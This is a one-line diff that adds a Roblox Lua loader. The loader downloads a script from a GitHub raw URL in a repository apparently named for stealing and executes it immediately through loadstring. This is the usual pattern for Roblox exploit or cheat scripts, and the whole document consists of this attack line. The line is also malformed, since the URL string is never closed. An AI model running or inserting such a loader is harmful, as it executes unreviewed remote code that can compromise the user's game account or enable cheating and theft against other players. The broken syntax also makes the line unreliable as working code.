@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/romperlasbolasconia-netizen/steala/refs/heads/main/scritpbase))()
